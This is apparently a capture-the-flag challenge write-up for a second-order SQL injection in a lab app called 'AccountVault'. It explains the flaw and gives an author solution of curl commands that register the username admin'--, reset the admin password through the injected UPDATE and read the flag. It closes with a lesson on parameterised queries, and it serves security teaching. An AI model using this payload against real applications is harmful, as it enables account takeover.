# Second-Order SQL Injection — AccountVault

Registration uses a parameterised INSERT (safe). The
`/change-password` handler reads the caller's stored username back
from the DB and interpolates it directly into an UPDATE query
(unsafe). A username that smuggles SQL through registration lands
the payload in the UPDATE — and lets you change any account's
password.

This is the **stored / second-order** form of injection: input
that's safe at write time but trusted at read time.

## Player target

Take over the `admin` account and read `/admin/flag`.

## Author solution

```bash
# 1. Register a username that breaks out of the WHERE clause.
curl -s -X POST http://target:5000/register \
  -H 'content-type: application/json' \
  -d $'{"username":"admin\'--","password":"x"}'

# 2. Login as that account.
TOK=$(curl -s -X POST http://target:5000/login \
        -H 'content-type: application/json' \
        -d $'{"username":"admin\'--","password":"x"}' \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# 3. /change-password — the server interpolates the stored username
#    into:
#       UPDATE users SET password = 'pwned123' WHERE username = 'admin'--'
#    Which sqlite parses as:
#       UPDATE users SET password = 'pwned123' WHERE username = 'admin'
curl -s -X POST http://target:5000/change-password \
  -H "Authorization: Bearer $TOK" \
  -H 'content-type: application/json' \
  -d '{"new_password":"pwned123"}'

# 4. Login as admin with your new password.
ADMIN=$(curl -s -X POST http://target:5000/login \
          -H 'content-type: application/json' \
          -d '{"username":"admin","password":"pwned123"}' \
        | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# 5. Flag.
curl -s http://target:5000/admin/flag -H "Authorization: Bearer $ADMIN"
```

## Why this is the lesson

Sanitisation is not a one-shot operation that "marks" data as
clean forever. Every query that interpolates string data is a
potential injection sink, regardless of where the value came
from. The right answer is to **always use parameterised queries**
— at write time *and* at read time. Trust boundaries are around
the SQL driver, not around the data.
